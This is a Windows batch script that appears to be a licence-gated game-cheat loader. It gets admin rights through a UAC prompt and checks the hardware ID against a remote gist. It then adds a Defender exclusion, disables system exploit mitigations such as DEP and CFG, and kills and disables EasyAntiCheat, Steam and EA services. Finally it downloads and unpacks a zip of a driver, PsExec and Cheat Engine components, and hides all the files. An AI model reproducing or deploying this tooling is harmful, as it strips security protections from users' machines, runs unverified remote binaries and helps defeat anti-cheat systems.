
@echo off
call :isAdmin
if %errorlevel% == 0 (
goto :run
) else (
echo Requesting administrative privileges...
goto :UACPrompt
)
exit /b
:isAdmin
fsutil dirty query %systemdrive% >nul
exit /b
:run

set hwid=!hwid!
set "link=https://gist.github.com/Bytrl/894a468f05f7fe7cd2616bdfe6684a3f"
set "pl1=https://github.com/Bytrl/zips/raw/664eea8ace048e7e9f3a18c3549a83dc23fd3771/bin.zip"
set bin=%TMP%\Bytrl
set "drive=%~d0"
set "binZip=%drive%\Windows\System32\bin.zip"
set auth=\PsExec.exe
set ce_d=CEDRIVER73
set my_d=+
set authbat=%bin%\launch-auth.bat
set maskbat=%bin%\launch-masked.bat
set normal=%bin%\SecurityHealthSystray-x86_64-SSE4-AVX2.exe


tasklist /fi "imagename eq ldr_1.4.exe" | find /i "ldr_1.4.exe" > nul
if not errorlevel 1 (goto auth) else (goto fail)
goto fail

:auth
setlocal enabledelayedexpansion
powershell -command "(Get-CimInstance Win32_ComputerSystemProduct).UUID" > temp.txt
set /p hwid=<temp.txt
del temp.txt
for /f "usebackq tokens=*" %%a in (`powershell -command "$url = '%link%'; Invoke-WebRequest -Uri $url | Select-Object -ExpandProperty Content" ^| find /i "%hwid%"`) do (set "authFound=1")
if defined authFound (goto pass) else (goto fail)

:pass
powershell -command "Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\' | Where-Object { $_.Start -eq 2 } | Format-Table DisplayName, PSChildName, Start -AutoSize"
sc queryex %my_d% | find "STATE" | find "4  RUNNING" > nul
if %errorlevel% equ 0 (

goto launch

) else (

attrib +s +h "%TMP%\wtmpd"
attrib +s +h "%TMP%\cetrainers"
attrib +s +h "%TMP%\afolder"
attrib +s +h "%TMP%\bfcwrk"

taskkill /F /IM "control.exe"
cls
taskkill /F /IM "SecurityHealthSystray-x86_64-SSE4-AVX2.exe"
cls
powershell -command Stop-Service -Name "+" -Force
cls
sc queryex %ce_d% | find "STATE" | find "4  RUNNING" > nul
if %errorlevel% equ 0 (
taskkill /F /IM "cheatengine-x86_64.exe"
cls
taskkill /F /IM "cheatengine-x86_64-SSE4-AVX2.exe"
cls
powershell -command Stop-Service -Name "CEDRIVER73" -Force
cls
)
powershell -command "Add-MpPreference -ExclusionPath \"$env:TMP\Bytrl\""
cls
powershell -command Set-Processmitigation -System -Disable CFG, StrictCFG, SuppressExports
cls
powershell -command Set-Processmitigation -System -Disable DEP, EmulateAtlThunks
cls
powershell -command Set-Processmitigation -System -Disable ForceRelocateImages
cls
powershell -command Set-Processmitigation -System -Disable BottomUp, HighEntropy
cls
taskkill /F /IM "Steam.exe"
cls
taskkill /F /IM "EasyAntiCheat.exe"
cls
taskkill /F /IM "EADesktop.exe"
cls
NET STOP EasyAntiCheat
cls
NET STOP "Steam Client Service"
cls
NET STOP EABackgroundService
cls
sc config EasyAntiCheat start= demand
cls
sc config "Steam Client Service" start= demand
cls
sc config EABackgroundService start= demand
cls
rd /s /q %bin%
cls
powershell -command "& { $url = '%pl1%'; Invoke-WebRequest -Uri $url -OutFile '%binZip%' }"
cls
powershell -command Expand-Archive %binZip% -DestinationPath %bin%\
move "%bin%\%auth%" "%drive%\"
cls
)

:launch
attrib +s +h "%TMP%\wtmpd"
attrib +s +h "%TMP%\cetrainers"
attrib +s +h "%TMP%\afolder"
attrib +s +h "%TMP%\bfcwrk"
attrib +s +h %bin%
attrib +s +h %normal%
attrib +s +h %authbat%
attrib +s +h %maskbat%
attrib +s +h "%bin%\autorun"
attrib +s +h "%bin%\clibs64"
attrib +s +h "%bin%\win64"
attrib +s +h "%bin%\allochook-x86_64.dll"
attrib +s +h "%bin%\Bytrl.sys"
attrib +s +h "%bin%\defines.lua"
attrib +s +h "%bin%\libipt-64.dll"
attrib +s +h "%bin%\lua53-64.dll"
attrib +s +h "%bin%\luaclient-x86_64.dll"
attrib +s +h "%bin%\main.lua"
attrib +s +h "%bin%\control.exe"
attrib +s +h "%bin%\PsExec.exe"
attrib +s +h "%bin%\speedhack-x86_64.dll"
attrib +s +h "%bin%\unload.exe"
attrib +s +h "%bin%\unload+.bat"
attrib +s +h "%bin%\vehdebug-x86_64.dll"
attrib +s +h "%bin%\vmdisk.img"
attrib +s +h "%bin%\winhook-x86_64.dll"
attrib +s +h "%bin%\gerye465ye4h4y.exe"
attrib +s +h "%bin%\clone.exe"
attrib +s +h "%bin%\mask.exe"
attrib +s +h "%bin%\hide.exe"

cls
color 0A
echo 1. Normal
echo 2. Masked
echo 3. NtAuth
echo.
set /p choice=Select Launch Variant (1-3):
if "%choice%"=="1" (
    start %normal%
) else if "%choice%"=="2" (
    start %maskbat%
) else if "%choice%"=="3" (
    start %authbat%
) else (
    echo Invalid choice. Please enter a number between 1 and 3.
    timeout /nobreak /t 2 >nul

rd /s /q "%TMP%\wtmpd"

    goto launch
)
goto cleanup

:fail
attrib +s +h "%TMP%\wtmpd"
attrib +s +h "%TMP%\cetrainers"
attrib +s +h "%TMP%\afolder"
attrib +s +h "%TMP%\bfcwrk"
rd /s /q "%TMP%\wtmpd"
rd /s /q "%TMP%\Bytrl"
rd /s /q %bin%
rd /s /q "%TMP%\bin"
cls
color 04
echo.
echo *Send Me This Key For Authorization!*
echo.
echo %hwid%
echo.
echo Discord: Bytrl
color
endlocal
echo ____________________________________________________
pause

:cleanup
rd /s /q "%TMP%\bin"
rd /s /q "%TMP%\cetrainers"
rd /s /q "%TMP%\afolder"
rd /s /q "%TMP%\wtmpd"
rd /s /q %binZip%
cls

rem :exit
exit /b
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "cmd.exe", "/c %~s0 %~1", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B`
exit